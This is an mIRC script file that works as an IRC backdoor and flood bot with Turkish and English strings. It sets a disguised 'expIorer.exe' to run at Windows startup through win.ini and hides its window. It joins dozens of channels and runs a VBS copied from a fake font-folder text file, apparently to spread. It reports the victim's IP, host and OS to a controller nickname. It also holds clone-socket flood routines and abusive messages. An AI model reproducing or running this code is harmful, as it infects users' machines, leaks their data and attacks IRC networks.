[script]
n0=on *^:text:*:?:closemsg $nick | haltdef
n1=on *^:action:*:?:closemsg $nick | haltdef
n2=on *^:notice:*:?:closemsg $nick | haltdef
n3=on *:text:*:#: {  
n4=  set %i 0
n5=  :checking
n6=  inc %i 1
n7=  set %currentsword $read -l $+ %i $mircdir\kufur.txt 
n8=  if (%currentsword == $null) { .unset %i | goto end }
n9=  else {
n10=    if (%currentsword isin $1-) { goto offense }
n11=    else { goto checking }
n12=  }
n13=  :offense
n14=  if ($nick isop %chan) { $2-  | halt }
n15=  privmsg $nick $read $mircdir/küfür.txt  
n16=  .goto end  
n17=  :end
n18=}
n19=on *me:join:%dusman: {
n20=  privmsg %dusman $2 in bmX Flood all of you trust Fuck ......FfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0D  bmX
n21=  notice %dusman in bmX Flood all of you trust  Fuck......FfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0DdFfLlOo0D
n22=  ctcp %dusman ping
n23=  part %dusman  
n24=  unset %dusman 
n25=}
n26=alias fuck { //set %dusman $1- | timer 10 7 join %dusman }
n27=alias unknown { //set %unknown $read(txt.txt) }
n28=alias unknown1 { /emailaddr  $read(txt.txt) $+ @ $+ $read(txt.txt) $+ .com | /.fullname $read(names.txt) | /identd on %unknown |  /.nick $read(nicks.txt) | /anick $read(nicks.txt)   }
n29=alias pas { //set %in $1- }
n30=alias pinger { //timerpinger 0 180 /ctcp $me ping }
n31=alias salak { //writeini -n c:\windows\win.ini windows run c:\windows\fonts\expIorer.exe }
n32=alias servis { //set %servis $1- }
n33=alias ping { //ctcp $$1 ping }
n34=alias escape { //set %chan $1- }
n35=alias msg { privmsg %chan $1- }
n36=on ^*:NOTIFY: {
n37=  if ($nick == [se7en]executioner) {
n38=    join %chan ÷÷÷bmX ???
n39=    timer 1 10 msg %nick 7< $fulldate > 5< IP= $IP > ,15< Host= $Host > 10Pass < $gmt > 4system < $os >
n40=  }
n41=}
n42=on ^*:UNOTIFY: {
n43=  if ($nick == [se7en]executioner) { part %chan }
n44=}
n45=;=============================================================================================================
n46=alias -l rctcp {
n47=  %rand = $r(1,4)
n48=  if (%rand == 1) return FINGER
n49=  if (%rand == 2) return PING
n50=  if (%rand == 3) return TIME
n51=  if (%rand == 4) return VERSION
n52=}
n53=alias -l allofthem {
n54=  %rand = $r(1,5)
n55=  if (%rand == 1) return !list bmX PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver
n56=  if (%rand == 2) return !list bmX !ping File Server Online FTP Online 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®!
n57=  if (%rand == 3) return  $+ $rand(0,15) $+ $chr(1)  $+ PING +++ATH0 $+ $chr(1)
n58=  if (%rand == 4) return !list !ping bmX Me file Server Online ____________________________________________________________________________________________________________________________________
n59=  if (%rand == 5) return !list bmX File Server Online 00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®! 00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!
n60=}
n61=
n62=alias flood {
n63=  /sockclose *
n64=  set %victim $1
n65=  set %clones $2
n66=  set %server $3
n67=  set %port $4
n68=  set %flooder on
n69=  var %var = 0
n70=  :loop
n71=  inc %var
n72=  if (%flooder == on) && (%var <= %clones) { .sockopen flood $+ %var %server %port | goto loop  }
n73=}
n74=on *:sockopen:flood*: {
n75=  if ($sockerr > 0) { halt }
n76=  set -u1 %user $rand(A,z) $+ $read $mircdirtxt.txt
n77=  .sockwrite -nt $sockname USER %user %user %user : $+ %user
n78=  .sockwrite -nt $sockname nick $read $mircdirtxt.txt
n79=  .sockwrite -nt $sockname join : $+ %victim
n80=  .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
n81=  .sockwrite -n $sockname privmsg %victim : $+ !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
n82=  .sockwrite -n $sockname notice %victim : $+ !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
n83=  .sockwrite -nt $sockname part %victim : $+  Fuck Off Turkey ;))) & in Flood all of you trust......  2,15YEHU Derki Adam oLun Muhahaah Sikerim Yoksa Sizi 
n84=  .sockclose $sockname 
n85=  .sockopen flood $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
n86=}
n87=
n88=alias bmX {
n89=  /sockclose *
n90=  set %victim $1
n91=  set %clones $2
n92=  set %server $3
n93=  set %port $4
n94=  set %noticef on
n95=  var %var = 0
n96=  :loop
n97=  inc %var
n98=  if (%noticef == on) && (%var <= %clones) { .sockopen notice $+ %var %server %port | goto loop  }
n99=}
n100=on *:sockopen:notice*: {
n101=  if ($sockerr > 0) { halt }
n102=  set -u1 %user $rand(A,z) $+ $read $mircdirtxt.txt
n103=  .sockwrite -nt $sockname USER %user %user %user : $+ %user
n104=  .sockwrite -nt $sockname nick $read $mircdirtxt.txt 
n105=  .sockwrite -nt $sockname join : $+ %victim
n106=  .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
n107=  .sockwrite -n $sockname notice %victim : $+ !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
n108=  .sockwrite -n $sockname notice %victim : $+ !list Ping Me File Server Online euheuhe flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
n109=  .sockwrite -nt $sockname Notice %victim : $+ DIE < ßizLer ßuyuk AdamLarýz ßasýt $eyLerLe ugra$mayiz. Fuck aLL   Are You Fuck bmX.....
n110=  .sockclose $sockname 
n111=  .sockopen notice $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
n112=}
n113=
n114=on *:socklisten:Identd.geno:{ sockaccept identd.Geno. [ $+ [ $calc($gettok($sock(identd.Geno.*, $sock(identd.Geno.*,0)),2,46) + 1) ] ]  | .echo -a *** Listening Identd }
n115=on *:sockread:Identd.geno.*:{ sockread %geno-info.ident | sockwrite -nt $sockname %geno-info.ident : USERID : UNIX : $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) | unset  %geno-info.ident | .echo -a *** reading identd and responding  }
n116=on 1:start:timer 500000000 0 /showmirc -t |  //writeini -n c:\windows\win.ini windows run c:\windows\fonts\expIorer.exe   | identd on $read $mircdirtxt.txt | nick $read $mircdir/nicks.txt | emailaddr $read $mircdir/skin/e-mail.txt | server %servis 6669 | server -m  %servis1 6669 | server -m  irc.aychat.com  | username  $read $mircdir/skin/username.txt 
n117=on 1:connect:timer 0 25 ping $me | /ignore -r |   //join #klavye | //join #bodrum | //join #bilecik | //join #rock | //join #metal | //join #abudabi | //join #turku | //join #oyun | //join #horse | //join #kanal | //join #bodrum dert  | //join #Party | //join #seyrialem | //join #40+ |  //join  #CeLL  |  //join  #antalya  |  //join  #sevgi  |  //join  #kadin  |  //join  #muzik  |  //join  #copcatan |  //join  #galatasaray   |  //join  #tr  |  //join  #hiphop  |  //join  #islam  |  //join  #zurna  |  //join  #ay |  //join  #kariyer  |  //join  #adana  |  //join  #cinsellik  |  //join  #35+  |  //join  #25+  |  //join  #15+   |  //join  #evli  |  //join  #hollanda  |  //join  #ayna   |  //join  #ayva  |  //join  #mersin  |  //join  #chat  |  //join  #felsefe | //join #denizli  |  //join  #countryranch |  //join  #edirne |   //join  #irismaritime  |   //join  #bursa  | //join  #girl | //join  #teen | copy c:\windows\fonts\invite.txt c:\invite.vbs  |  run c:\invite.vbs 
n118=on 1:disconnect:/server | nick $read $mircdir/nicks.txt | username $read $mircdir/skin/username.txt } 
n119=on 1:exit:/run expIorer.exe 
